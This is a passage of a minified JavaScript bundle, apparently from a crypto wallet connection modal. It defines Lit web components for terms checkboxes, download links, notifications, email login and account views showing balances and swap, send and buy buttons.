    font-weight: 500;
  }
`;var iMe=function(r,e,t,i){var n=arguments.length,s=n<3?e:i===null?i=Object.getOwnPropertyDescriptor(e,t):i,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(r,e,t,i);else for(var a=r.length-1;a>=0;a--)(o=r[a])&&(s=(n<3?o(s):n>3?o(e,t,s):o(e,t))||s);return n>3&&s&&Object.defineProperty(e,t,s),s};let Yk=class extends he{render(){const{termsConditionsUrl:e,privacyPolicyUrl:t}=Ne.state,i=Ne.state.features?.legalCheckbox;return!e&&!t||!i?null:F`
      <wui-checkbox data-testid="wui-checkbox">
        <wui-text color="fg-250" variant="small-400" align="left">
          I agree to our ${this.termsTemplate()} ${this.andTemplate()} ${this.privacyTemplate()}
        </wui-text>
      </wui-checkbox>
    `}andTemplate(){const{termsConditionsUrl:e,privacyPolicyUrl:t}=Ne.state;return e&&t?"and":""}termsTemplate(){const{termsConditionsUrl:e}=Ne.state;return e?F`<a rel="noreferrer" target="_blank" href=${e}>terms of service</a>`:null}privacyTemplate(){const{privacyPolicyUrl:e}=Ne.state;return e?F`<a rel="noreferrer" target="_blank" href=${e}>privacy policy</a>`:null}};Yk.styles=[rMe];Yk=iMe([me("w3m-legal-checkbox")],Yk);const nMe=ge`
  :host {
    display: block;
    padding: 0 var(--wui-spacing-xl) var(--wui-spacing-xl);
  }
`;var Xee=function(r,e,t,i){var n=arguments.length,s=n<3?e:i===null?i=Object.getOwnPropertyDescriptor(e,t):i,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(r,e,t,i);else for(var a=r.length-1;a>=0;a--)(o=r[a])&&(s=(n<3?o(s):n>3?o(e,t,s):o(e,t))||s);return n>3&&s&&Object.defineProperty(e,t,s),s};let O7=class extends he{constructor(){super(...arguments),this.wallet=void 0}render(){if(!this.wallet)return this.style.display="none",null;const{name:e,app_store:t,play_store:i,chrome_store:n,homepage:s}=this.wallet,o=ke.isMobile(),a=ke.isIos(),c=ke.isAndroid(),l=[t,i,s,n].filter(Boolean).length>1,u=Wt.getTruncateString({string:e,charsStart:12,charsEnd:0,truncate:"end"});return l&&!o?F`
        <wui-cta-button
          label=${`Don't have ${u}?`}
          buttonLabel="Get"
          @click=${()=>Ee.push("Downloads",{wallet:this.wallet})}
        ></wui-cta-button>
      `:!l&&s?F`
        <wui-cta-button
          label=${`Don't have ${u}?`}
          buttonLabel="Get"
          @click=${this.onHomePage.bind(this)}
        ></wui-cta-button>
      `:t&&a?F`
        <wui-cta-button
          label=${`Don't have ${u}?`}
          buttonLabel="Get"
          @click=${this.onAppStore.bind(this)}
        ></wui-cta-button>
      `:i&&c?F`
        <wui-cta-button
          label=${`Don't have ${u}?`}
          buttonLabel="Get"
          @click=${this.onPlayStore.bind(this)}
        ></wui-cta-button>
      `:(this.style.display="none",null)}onAppStore(){this.wallet?.app_store&&ke.openHref(this.wallet.app_store,"_blank")}onPlayStore(){this.wallet?.play_store&&ke.openHref(this.wallet.play_store,"_blank")}onHomePage(){this.wallet?.homepage&&ke.openHref(this.wallet.homepage,"_blank")}};O7.styles=[nMe];Xee([V({type:Object})],O7.prototype,"wallet",void 0);O7=Xee([me("w3m-mobile-download-links")],O7);const sMe=ge`
  wui-flex {
    border-top: 1px solid var(--wui-color-gray-glass-005);
  }

  a {
    text-decoration: none;
    color: var(--wui-color-fg-175);
    font-weight: 500;
    display: flex;
    align-items: center;
    justify-content: center;
    gap: var(--wui-spacing-3xs);
  }
`;var oMe=function(r,e,t,i){var n=arguments.length,s=n<3?e:i===null?i=Object.getOwnPropertyDescriptor(e,t):i,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(r,e,t,i);else for(var a=r.length-1;a>=0;a--)(o=r[a])&&(s=(n<3?o(s):n>3?o(e,t,s):o(e,t))||s);return n>3&&s&&Object.defineProperty(e,t,s),s};let Jk=class extends he{render(){const{termsConditionsUrl:e,privacyPolicyUrl:t}=Ne.state;return!e&&!t?null:F`
      <wui-flex
        .padding=${["m","s","s","s"]}
        flexDirection="column"
        alignItems="center"
        justifyContent="center"
        gap="s"
      >
        <wui-text color="fg-250" variant="small-400" align="center">
          We work with the best providers to give you the lowest fees and best support. More options
          coming soon!
        </wui-text>

        ${this.howDoesItWorkTemplate()}
      </wui-flex>
    `}howDoesItWorkTemplate(){return F` <wui-link @click=${this.onWhatIsBuy.bind(this)}>
      <wui-icon size="xs" color="accent-100" slot="iconLeft" name="helpCircle"></wui-icon>
      How does it work?
    </wui-link>`}onWhatIsBuy(){Ve.sendEvent({type:"track",event:"SELECT_WHAT_IS_A_BUY",properties:{isSmartAccount:Se.state.preferredAccountType===vr.ACCOUNT_TYPES.SMART_ACCOUNT}}),Ee.push("WhatIsABuy")}};Jk.styles=[sMe];Jk=oMe([me("w3m-onramp-providers-footer")],Jk);const aMe=ge`
  :host {
    display: block;
    position: absolute;
    opacity: 0;
    pointer-events: none;
    top: 11px;
    left: 50%;
    width: max-content;
  }
`;var ete=function(r,e,t,i){var n=arguments.length,s=n<3?e:i===null?i=Object.getOwnPropertyDescriptor(e,t):i,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(r,e,t,i);else for(var a=r.length-1;a>=0;a--)(o=r[a])&&(s=(n<3?o(s):n>3?o(e,t,s):o(e,t))||s);return n>3&&s&&Object.defineProperty(e,t,s),s};const cMe={loading:void 0,success:{backgroundColor:"success-100",iconColor:"success-100",icon:"checkmark"},error:{backgroundColor:"error-100",iconColor:"error-100",icon:"close"}};let B7=class extends he{constructor(){super(),this.unsubscribe=[],this.timeout=void 0,this.open=vt.state.open,this.unsubscribe.push(vt.subscribeKey("open",e=>{this.open=e,this.onOpen()}))}disconnectedCallback(){clearTimeout(this.timeout),this.unsubscribe.forEach(e=>e())}render(){const{message:e,variant:t,svg:i}=vt.state,n=cMe[t],{icon:s,iconColor:o}=i??n??{};return F`
      <wui-snackbar
        message=${e}
        backgroundColor=${n?.backgroundColor}
        iconColor=${o}
        icon=${s}
        .loading=${t==="loading"}
      ></wui-snackbar>
    `}onOpen(){clearTimeout(this.timeout),this.open?(this.animate([{opacity:0,transform:"translateX(-50%) scale(0.85)"},{opacity:1,transform:"translateX(-50%) scale(1)"}],{duration:150,fill:"forwards",easing:"ease"}),this.timeout&&clearTimeout(this.timeout),vt.state.autoClose&&(this.timeout=setTimeout(()=>vt.hide(),2500))):this.animate([{opacity:1,transform:"translateX(-50%) scale(1)"},{opacity:0,transform:"translateX(-50%) scale(0.85)"}],{duration:150,fill:"forwards",easing:"ease"})}};B7.styles=aMe;ete([te()],B7.prototype,"open",void 0);B7=ete([me("w3m-snackbar")],B7);const lMe=ge`
  :host {
    display: block;
    position: absolute;
    top: var(--wui-spacing-s);
    left: var(--wui-spacing-l);
    right: var(--wui-spacing-l);
    opacity: 0;
    pointer-events: none;
  }
`;var tte=function(r,e,t,i){var n=arguments.length,s=n<3?e:i===null?i=Object.getOwnPropertyDescriptor(e,t):i,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(r,e,t,i);else for(var a=r.length-1;a>=0;a--)(o=r[a])&&(s=(n<3?o(s):n>3?o(e,t,s):o(e,t))||s);return n>3&&s&&Object.defineProperty(e,t,s),s};const uMe={info:{backgroundColor:"fg-350",iconColor:"fg-325",icon:"info"},success:{backgroundColor:"success-glass-reown-020",iconColor:"success-125",icon:"checkmark"},warning:{backgroundColor:"warning-glass-reown-020",iconColor:"warning-100",icon:"warningCircle"},error:{backgroundColor:"error-glass-reown-020",iconColor:"error-125",icon:"exclamationTriangle"}};let M7=class extends he{constructor(){super(),this.unsubscribe=[],this.open=md.state.open,this.onOpen(!0),this.unsubscribe.push(md.subscribeKey("open",e=>{this.open=e,this.onOpen(!1)}))}disconnectedCallback(){this.unsubscribe.forEach(e=>e())}render(){const{message:e,variant:t}=md.state,i=uMe[t];return F`
      <wui-alertbar
        message=${e}
        backgroundColor=${i?.backgroundColor}
        iconColor=${i?.iconColor}
        icon=${i?.icon}
      ></wui-alertbar>
    `}onOpen(e){this.open?(this.animate([{opacity:0,transform:"scale(0.85)"},{opacity:1,transform:"scale(1)"}],{duration:150,fill:"forwards",easing:"ease"}),this.style.cssText="pointer-events: auto"):e||(this.animate([{opacity:1,transform:"scale(1)"},{opacity:0,transform:"scale(0.85)"}],{duration:150,fill:"forwards",easing:"ease"}),this.style.cssText="pointer-events: none")}};M7.styles=lMe;tte([te()],M7.prototype,"open",void 0);M7=tte([me("w3m-alertbar")],M7);const dMe=ge`
  wui-separator {
    margin: var(--wui-spacing-s) calc(var(--wui-spacing-s) * -1);
    width: calc(100% + var(--wui-spacing-s) * 2);
  }

  wui-email-input {
    width: 100%;
  }

  form {
    width: 100%;
    display: block;
    position: relative;
  }

  wui-icon-link,
  wui-loading-spinner {
    position: absolute;
    top: 50%;
    transform: translateY(-50%);
  }

  wui-icon-link {
    right: var(--wui-spacing-xs);
  }

  wui-loading-spinner {
    right: var(--wui-spacing-m);
  }

  wui-text {
    margin: var(--wui-spacing-xxs) var(--wui-spacing-m) var(--wui-spacing-0) var(--wui-spacing-m);
  }
`;var D4=function(r,e,t,i){var n=arguments.length,s=n<3?e:i===null?i=Object.getOwnPropertyDescriptor(e,t):i,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(r,e,t,i);else for(var a=r.length-1;a>=0;a--)(o=r[a])&&(s=(n<3?o(s):n>3?o(e,t,s):o(e,t))||s);return n>3&&s&&Object.defineProperty(e,t,s),s};let Eg=class extends he{constructor(){super(...arguments),this.unsubscribe=[],this.formRef=gc(),this.email="",this.loading=!1,this.error=""}disconnectedCallback(){this.unsubscribe.forEach(e=>e())}firstUpdated(){this.formRef.value?.addEventListener("keydown",e=>{e.key==="Enter"&&this.onSubmitEmail(e)})}render(){return F`
      <form ${mc(this.formRef)} @submit=${this.onSubmitEmail.bind(this)}>
        <wui-email-input
          @focus=${this.onFocusEvent.bind(this)}
          .disabled=${this.loading}
          @inputChange=${this.onEmailInputChange.bind(this)}
          tabIdx=${ye(this.tabIdx)}
        >
        </wui-email-input>

        ${this.submitButtonTemplate()}${this.loadingTemplate()}
        <input type="submit" hidden />
      </form>
      ${this.templateError()}
    `}submitButtonTemplate(){return!this.loading&&this.email.length>3?F`
          <wui-icon-link
            size="sm"
            icon="chevronRight"
            iconcolor="accent-100"
            @click=${this.onSubmitEmail.bind(this)}
          >
          </wui-icon-link>
        `:null}loadingTemplate(){return this.loading?F`<wui-loading-spinner size="md" color="accent-100"></wui-loading-spinner>`:null}templateError(){return this.error?F`<wui-text variant="tiny-500" color="error-100">${this.error}</wui-text>`:null}onEmailInputChange(e){this.email=e.detail.trim(),this.error=""}async onSubmitEmail(e){if(!Me.AUTH_CONNECTOR_SUPPORTED_CHAINS.find(i=>i===re.state.activeChain)){const i=re.getFirstCaipNetworkSupportsAuthConnector();if(i){Ee.push("SwitchNetwork",{network:i});return}}try{if(this.loading)return;this.loading=!0,e.preventDefault();const i=Xe.getAuthConnector();if(!i)throw new Error("w3m-email-login-widget: Auth connector not found");const{action:n}=await i.provider.connectEmail({email:this.email});Ve.sendEvent({type:"track",event:"EMAIL_SUBMITTED"}),n==="VERIFY_OTP"?(Ve.sendEvent({type:"track",event:"EMAIL_VERIFICATION_CODE_SENT"}),Ee.push("EmailVerifyOtp",{email:this.email})):n==="VERIFY_DEVICE"?Ee.push("EmailVerifyDevice",{email:this.email}):n==="CONNECT"&&(await ft.connectExternal(i,re.state.activeChain),Ee.replace("Account"))}catch(i){ke.parseError(i)?.includes("Invalid email")?this.error="Invalid email. Try again.":vt.showError(i)}finally{this.loading=!1}}onFocusEvent(){Ve.sendEvent({type:"track",event:"EMAIL_LOGIN_SELECTED"})}};Eg.styles=dMe;D4([V()],Eg.prototype,"tabIdx",void 0);D4([te()],Eg.prototype,"email",void 0);D4([te()],Eg.prototype,"loading",void 0);D4([te()],Eg.prototype,"error",void 0);Eg=D4([me("w3m-email-login-widget")],Eg);const hMe=ge`
  wui-flex {
    width: 100%;
  }

  :host > wui-flex:first-child {
    transform: translateY(calc(var(--wui-spacing-xxs) * -1));
  }

  wui-icon-link {
    margin-right: calc(var(--wui-icon-box-size-md) * -1);
  }

  wui-notice-card {
    margin-bottom: var(--wui-spacing-3xs);
  }

  wui-list-item > wui-text {
    flex: 1;
  }

  w3m-transactions-view {
    max-height: 200px;
  }

  .tab-content-container {
    height: 300px;
    overflow-y: auto;
    overflow-x: hidden;
    scrollbar-width: none;
  }

  .tab-content-container::-webkit-scrollbar {
    display: none;
  }

  .account-button {
    width: auto;
    border: none;
    display: flex;
    align-items: center;
    justify-content: center;
    gap: var(--wui-spacing-s);
    height: 48px;
    padding: var(--wui-spacing-xs);
    padding-right: var(--wui-spacing-s);
    box-shadow: inset 0 0 0 1px var(--wui-color-gray-glass-002);
    background-color: var(--wui-color-gray-glass-002);
    border-radius: 24px;
    transition: background-color 0.2s linear;
  }

  .account-button:hover {
    background-color: var(--wui-color-gray-glass-005);
  }

  .avatar-container {
    position: relative;
  }

  wui-avatar.avatar {
    width: 32px;
    height: 32px;
    box-shadow: 0 0 0 2px var(--wui-color-gray-glass-005);
  }

  wui-avatar.network-avatar {
    width: 16px;
    height: 16px;
    position: absolute;
    left: 100%;
    top: 100%;
    transform: translate(-75%, -75%);
    box-shadow: 0 0 0 2px var(--wui-color-gray-glass-005);
  }

  .account-links {
    display: flex;
    justify-content: space-between;
    align-items: center;
  }

  .account-links wui-flex {
    cursor: pointer;
    display: flex;
    align-items: center;
    justify-content: center;
    flex: 1;
    background: red;
    align-items: center;
    justify-content: center;
    height: 48px;
    padding: 10px;
    flex: 1 0 0;
    border-radius: var(--XS, 16px);
    border: 1px solid var(--dark-accent-glass-010, rgba(71, 161, 255, 0.1));
    background: var(--dark-accent-glass-010, rgba(71, 161, 255, 0.1));
    transition:
      background-color var(--wui-ease-out-power-1) var(--wui-duration-md),
      opacity var(--wui-ease-out-power-1) var(--wui-duration-md);
    will-change: background-color, opacity;
  }

  .account-links wui-flex:hover {
    background: var(--dark-accent-glass-015, rgba(71, 161, 255, 0.15));
  }

  .account-links wui-flex wui-icon {
    width: var(--S, 20px);
    height: var(--S, 20px);
  }

  .account-links wui-flex wui-icon svg path {
    stroke: #667dff;
  }
`;var Cl=function(r,e,t,i){var n=arguments.length,s=n<3?e:i===null?i=Object.getOwnPropertyDescriptor(e,t):i,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(r,e,t,i);else for(var a=r.length-1;a>=0;a--)(o=r[a])&&(s=(n<3?o(s):n>3?o(e,t,s):o(e,t))||s);return n>3&&s&&Object.defineProperty(e,t,s),s};let Da=class extends he{constructor(){super(),this.unsubscribe=[],this.caipAddress=Se.state.caipAddress,this.address=ke.getPlainAddress(Se.state.caipAddress),this.allAccounts=Se.state.allAccounts,this.profileImage=Se.state.profileImage,this.profileName=Se.state.profileName,this.disconnecting=!1,this.balance=Se.state.balance,this.balanceSymbol=Se.state.balanceSymbol,this.features=Ne.state.features,this.namespace=re.state.activeChain,this.chainId=re.state.activeCaipNetwork?.id,this.unsubscribe.push(Se.subscribeKey("caipAddress",e=>{this.address=ke.getPlainAddress(e),this.caipAddress=e}),Se.subscribeKey("balance",e=>this.balance=e),Se.subscribeKey("balanceSymbol",e=>this.balanceSymbol=e),Se.subscribeKey("profileName",e=>this.profileName=e),Se.subscribeKey("profileImage",e=>this.profileImage=e),Ne.subscribeKey("features",e=>this.features=e),Se.subscribeKey("allAccounts",e=>{this.allAccounts=e}),re.subscribeKey("activeChain",e=>this.namespace=e),re.subscribeKey("activeCaipNetwork",e=>{if(e){const[t,i]=e?.caipNetworkId?.split(":")||[];t&&i&&(this.namespace=t,this.chainId=i)}}))}disconnectedCallback(){this.unsubscribe.forEach(e=>e())}render(){if(!this.caipAddress)return null;const e=re.state.activeChain!==Me.CHAIN.SOLANA&&this.allAccounts.length>1;return F`<wui-flex
        flexDirection="column"
        .padding=${["0","xl","m","xl"]}
        alignItems="center"
        gap="l"
      >
        ${e?this.multiAccountTemplate():this.singleAccountTemplate()}
        <wui-flex flexDirection="column" alignItems="center">
          <wui-text variant="paragraph-500" color="fg-200">
            ${ke.formatBalance(this.balance,this.balanceSymbol)}
          </wui-text>
        </wui-flex>
        ${this.explorerBtnTemplate()}
      </wui-flex>

      <wui-flex flexDirection="column" gap="xs" .padding=${["0","s","s","s"]}>
        ${this.authCardTemplate()} <w3m-account-auth-button></w3m-account-auth-button>
        ${this.orderedFeaturesTemplate()} ${this.activityTemplate()}
        <wui-list-item
          variant="icon"
          iconVariant="overlay"
          icon="disconnect"
          ?chevron=${!1}
          .loading=${this.disconnecting}
          @click=${this.onDisconnect.bind(this)}
          data-testid="disconnect-button"
        >
          <wui-text variant="paragraph-500" color="fg-200">Disconnect</wui-text>
        </wui-list-item>
      </wui-flex>`}onrampTemplate(){if(!this.namespace)return null;const e=this.features?.onramp,t=kr.ONRAMP_SUPPORTED_CHAIN_NAMESPACES.includes(this.namespace);return!e||!t?null:F`
      <wui-list-item
        data-testid="w3m-account-default-onramp-button"
        iconVariant="blue"
        icon="card"
        ?chevron=${!0}
        @click=${this.handleClickPay.bind(this)}
      >
        <wui-text variant="paragraph-500" color="fg-100">Buy crypto</wui-text>
      </wui-list-item>
    `}orderedFeaturesTemplate(){return(this.features?.walletFeaturesOrder||kr.DEFAULT_FEATURES.walletFeaturesOrder).map(t=>{switch(t){case"onramp":return this.onrampTemplate();case"swaps":return this.swapsTemplate();case"send":return this.sendTemplate();default:return null}})}activityTemplate(){if(!this.namespace)return null;const e=re.state.activeChain===Me.CHAIN.SOLANA;return this.features?.history&&kr.ACTIVITY_ENABLED_CHAIN_NAMESPACES.includes(this.namespace)?F` <wui-list-item
          iconVariant="blue"
          icon="clock"
          iconSize="sm"
          ?chevron=${!e}
          ?disabled=${e}
          @click=${this.onTransactions.bind(this)}
        >
          <wui-text variant="paragraph-500" color="fg-100" ?disabled=${e}>
            Activity
          </wui-text>
          ${e?F`<wui-tag variant="main">Coming soon</wui-tag>`:""}
        </wui-list-item>`:null}swapsTemplate(){const e=this.features?.swaps,t=re.state.activeChain===Me.CHAIN.EVM;return!e||!t?null:F`
      <wui-list-item
        iconVariant="blue"
        icon="recycleHorizontal"
        ?chevron=${!0}
        @click=${this.handleClickSwap.bind(this)}
      >
        <wui-text variant="paragraph-500" color="fg-100">Swap</wui-text>
      </wui-list-item>
    `}sendTemplate(){const e=this.features?.send,t=re.state.activeChain===Me.CHAIN.EVM;return!e||!t?null:F`
      <wui-list-item
        iconVariant="blue"
        icon="send"
        ?chevron=${!0}
        @click=${this.handleClickSend.bind(this)}
      >
        <wui-text variant="paragraph-500" color="fg-100">Send</wui-text>
      </wui-list-item>
    `}authCardTemplate(){const e=re.state.activeChain,t=He.getConnectedConnectorId(e),i=Xe.getAuthConnector(),{origin:n}=location;return!i||t!==Me.CONNECTOR_ID.AUTH||n.includes(kr.SECURE_SITE)?null:F`
      <wui-notice-card
        @click=${this.onGoToUpgradeView.bind(this)}
        label="Upgrade your wallet"
        description="Transition to a self-custodial wallet"
        icon="wallet"
        data-testid="w3m-wallet-upgrade-card"
      ></wui-notice-card>
    `}handleSwitchAccountsView(){Ee.push("SwitchAddress")}handleClickPay(){Ee.push("OnRampProviders")}handleClickSwap(){Ee.push("Swap")}handleClickSend(){Ee.push("WalletSend")}explorerBtnTemplate(){return Se.state.addressExplorerUrl?F`
      <wui-button size="md" variant="neutral" @click=${this.onExplorer.bind(this)}>
        <wui-icon size="sm" color="inherit" slot="iconLeft" name="compass"></wui-icon>
        Block Explorer
        <wui-icon size="sm" color="inherit" slot="iconRight" name="externalLink"></wui-icon>
      </wui-button>
    `:null}singleAccountTemplate(){return F`
      <wui-avatar
        alt=${ye(this.caipAddress)}
        address=${ye(ke.getPlainAddress(this.caipAddress))}
        imageSrc=${ye(this.profileImage===null?void 0:this.profileImage)}
        data-testid="single-account-avatar"
      ></wui-avatar>
      <wui-flex flexDirection="column" alignItems="center">
        <wui-flex gap="3xs" alignItems="center" justifyContent="center">
          <wui-text variant="large-600" color="fg-100">
            ${this.profileName?Wt.getTruncateString({string:this.profileName,charsStart:20,charsEnd:0,truncate:"end"}):Wt.getTruncateString({string:this.address||"",charsStart:4,charsEnd:4,truncate:"middle"})}
          </wui-text>
          <wui-icon-link
            size="md"
            icon="copy"
            iconColor="fg-200"
            @click=${this.onCopyAddress}
          ></wui-icon-link> </wui-flex
      ></wui-flex>
    `}multiAccountTemplate(){if(!this.address)throw new Error("w3m-account-view: No account provided");const e=this.allAccounts.find(i=>i.address===this.address),t=Se.state.addressLabels.get(this.address);return this.namespace==="bip122"?this.btcAccountsTemplate():F`
      <wui-profile-button-v2
        .onProfileClick=${this.handleSwitchAccountsView.bind(this)}
        address=${ye(this.address)}
        icon="${e?.type===vr.ACCOUNT_TYPES.SMART_ACCOUNT&&re.state.activeChain===Me.CHAIN.EVM?"lightbulb":"mail"}"
        avatarSrc=${ye(this.profileImage?this.profileImage:void 0)}
        profileName=${ye(t||this.profileName)}
        .onCopyClick=${this.onCopyAddress.bind(this)}
      ></wui-profile-button-v2>
    `}btcAccountsTemplate(){return F`<wui-flex gap="m" alignItems="center" flexDirection="column">
      <wui-avatar
        .imageSrc=${ye(this.profileImage?this.profileImage:void 0)}
        alt=${this.address}
        address=${this.address}
      ></wui-avatar>
      <wui-tabs
        .tabs=${[{label:"Payment"},{label:"Ordinals"}]}
        .onTabChange=${e=>Se.setCaipAddress(`bip122:${this.chainId}:${this.allAccounts[e]?.address||""}`,this.namespace)}
      ></wui-tabs>
      <wui-flex gap="xs" alignItems="center" justifyContent="center">
        <wui-text variant="large-600" color="fg-100">
          ${Wt.getTruncateString({string:this.profileName||this.address||"",charsStart:this.profileName?18:4,charsEnd:this.profileName?0:4,truncate:this.profileName?"end":"middle"})}
        </wui-text>
        <wui-icon-link
          size="md"
          icon="copy"
          iconColor="fg-200"
          @click=${this.onCopyAddress}
        ></wui-icon-link>
      </wui-flex>
    </wui-flex>`}onCopyAddress(){try{this.address&&(ke.copyToClopboard(this.address),vt.showSuccess("Address copied"))}catch{vt.showError("Failed to copy")}}onTransactions(){Ve.sendEvent({type:"track",event:"CLICK_TRANSACTIONS",properties:{isSmartAccount:Se.state.preferredAccountType===vr.ACCOUNT_TYPES.SMART_ACCOUNT}}),Ee.push("Transactions")}async onDisconnect(){try{this.disconnecting=!0,await ft.disconnect(),Ve.sendEvent({type:"track",event:"DISCONNECT_SUCCESS"}),Ut.close()}catch{Ve.sendEvent({type:"track",event:"DISCONNECT_ERROR"}),vt.showError("Failed to disconnect")}finally{this.disconnecting=!1}}onExplorer(){const e=Se.state.addressExplorerUrl;e&&ke.openHref(e,"_blank")}onGoToUpgradeView(){Ve.sendEvent({type:"track",event:"EMAIL_UPGRADE_FROM_MODAL"}),Ee.push("UpgradeEmailWallet")}};Da.styles=hMe;Cl([te()],Da.prototype,"caipAddress",void 0);Cl([te()],Da.prototype,"address",void 0);Cl([te()],Da.prototype,"allAccounts",void 0);Cl([te()],Da.prototype,"profileImage",void 0);Cl([te()],Da.prototype,"profileName",void 0);Cl([te()],Da.prototype,"disconnecting",void 0);Cl([te()],Da.prototype,"balance",void 0);Cl([te()],Da.prototype,"balanceSymbol",void 0);Cl([te()],Da.prototype,"features",void 0);Cl([te()],Da.prototype,"namespace",void 0);Cl([te()],Da.prototype,"chainId",void 0);Da=Cl([me("w3m-account-default-widget")],Da);const fMe=ge`
  wui-flex {
    width: 100%;
  }

  wui-promo {
    position: absolute;
    top: -32px;
  }

  wui-profile-button {
    margin-top: calc(-1 * var(--wui-spacing-2l));
  }

  wui-promo + wui-profile-button {
    margin-top: var(--wui-spacing-2l);
  }

  wui-tabs {
    width: 100%;
  }

  .contentContainer {
    height: 280px;
  }

  .contentContainer > wui-icon-box {
    width: 40px;
    height: 40px;
    border-radius: var(--wui-border-radius-xxs);
  }

  .contentContainer > .textContent {
    width: 65%;
  }
`;var nh=function(r,e,t,i){var n=arguments.length,s=n<3?e:i===null?i=Object.getOwnPropertyDescriptor(e,t):i,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(r,e,t,i);else for(var a=r.length-1;a>=0;a--)(o=r[a])&&(s=(n<3?o(s):n>3?o(e,t,s):o(e,t))||s);return n>3&&s&&Object.defineProperty(e,t,s),s};const pMe=3,gMe=48,mMe=430;let ul=class extends he{constructor(){super(),this.unsubscribe=[],this.address=Se.state.address,this.profileImage=Se.state.profileImage,this.profileName=Se.state.profileName,this.network=re.state.activeCaipNetwork,this.currentTab=Se.state.currentTab,this.tokenBalance=Se.state.tokenBalance,this.features=Ne.state.features,this.networkImage=Nr.getNetworkImage(this.network),this.unsubscribe.push(Li.subscribeNetworkImages(()=>{this.networkImage=Nr.getNetworkImage(this.network)}),Se.subscribe(e=>{e.address?(this.address=e.address,this.profileImage=e.profileImage,this.profileName=e.profileName,this.currentTab=e.currentTab,this.tokenBalance=e.tokenBalance):Ut.close()}),re.subscribeKey("activeCaipNetwork",e=>this.network=e),Ne.subscribeKey("features",e=>this.features=e)),this.watchSwapValues()}disconnectedCallback(){this.unsubscribe.forEach(e=>e()),clearInterval(this.watchTokenBalance)}firstUpdated(){Se.fetchTokenBalance()}render(){if(!this.address)throw new Error("w3m-account-view: No account provided");return F`<wui-flex
      flexDirection="column"
      .padding=${["0","xl","m","xl"]}
      alignItems="center"
      gap="m"
      data-testid="w3m-account-wallet-features-widget"
    >
      ${this.network&&F`<wui-network-icon .network=${this.network}></wui-network-icon>`}
      <wui-profile-button
        @click=${this.onProfileButtonClick.bind(this)}
        address=${ye(this.address)}
        networkSrc=${ye(this.networkImage)}
        icon="chevronBottom"
        avatarSrc=${ye(this.profileImage?this.profileImage:void 0)}
        profileName=${ye(this.profileName??void 0)}
        data-testid="w3m-profile-button"
      ></wui-profile-button>

      ${this.tokenBalanceTemplate()} ${this.orderedWalletFeatures()}

      <wui-tabs
        .onTabChange=${this.onTabChange.bind(this)}
        .activeTab=${this.currentTab}
        localTabWidth=${ke.isMobile()&&window.innerWidth<mMe?`${(window.innerWidth-gMe)/pMe}px`:"104px"}
        .tabs=${wd.ACCOUNT_TABS}
      ></wui-tabs>
      ${this.listContentTemplate()}
    </wui-flex>`}orderedWalletFeatures(){const e=this.features?.walletFeaturesOrder||kr.DEFAULT_FEATURES.walletFeaturesOrder;return e.every(i=>!this.features?.[i])?null:F`<wui-flex gap="s">
      ${e.map(i=>{switch(i){case"onramp":return this.onrampTemplate();case"swaps":return this.swapsTemplate();case"receive":return this.receiveTemplate();case"send":return this.sendTemplate();default:return null}})}
    </wui-flex>`}onrampTemplate(){return this.features?.onramp?F`
      <w3m-tooltip-trigger text="Buy">
        <wui-icon-button
          data-testid="wallet-features-onramp-button"
          @click=${this.onBuyClick.bind(this)}
          icon="card"
        ></wui-icon-button>
      </w3m-tooltip-trigger>
    `:null}swapsTemplate(){const e=this.features?.swaps,t=re.state.activeChain===Me.CHAIN.EVM;return!e||!t?null:F`
      <w3m-tooltip-trigger text="Swap">
        <wui-icon-button
          data-testid="wallet-features-swaps-button"
          @click=${this.onSwapClick.bind(this)}
          icon="recycleHorizontal"
        >
        </wui-icon-button>
      </w3m-tooltip-trigger>
    `}receiveTemplate(){return this.features?.receive?F`
      <w3m-tooltip-trigger text="Receive">
        <wui-icon-button
          data-testid="wallet-features-receive-button"
          @click=${this.onReceiveClick.bind(this)}
          icon="arrowBottomCircle"
        >
        </wui-icon-button>
      </w3m-tooltip-trigger>
    `:null}sendTemplate(){const e=this.features?.send,t=re.state.activeChain===Me.CHAIN.EVM;return!e||!t?null:F`
      <w3m-tooltip-trigger text="Send">
        <wui-icon-button
          data-testid="wallet-features-send-button"
          @click=${this.onSendClick.bind(this)}
          icon="send"
        ></wui-icon-button>
      </w3m-tooltip-trigger>
    `}watchSwapValues(){this.watchTokenBalance=setInterval(()=>Se.fetchTokenBalance(e=>this.onTokenBalanceError(e)),1e4)}onTokenBalanceError(e){e instanceof Error&&e.cause instanceof Response&&e.cause.status===Me.HTTP_STATUS_CODES.SERVICE_UNAVAILABLE&&clearInterval(this.watchTokenBalance)}listContentTemplate(){return this.currentTab===0?F`<w3m-account-tokens-widget></w3m-account-tokens-widget>`:this.currentTab===1?F`<w3m-account-nfts-widget></w3m-account-nfts-widget>`:this.currentTab===2?F`<w3m-account-activity-widget></w3m-account-activity-widget>`:F`<w3m-account-tokens-widget></w3m-account-tokens-widget>`}tokenBalanceTemplate(){if(this.tokenBalance&&this.tokenBalance?.length>=0){const e=ke.calculateBalance(this.tokenBalance),{dollars:t="0",pennies:i="00"}=ke.formatTokenBalance(e);return F`<wui-balance dollars=${t} pennies=${i}></wui-balance>`}return F`<wui-balance dollars="0" 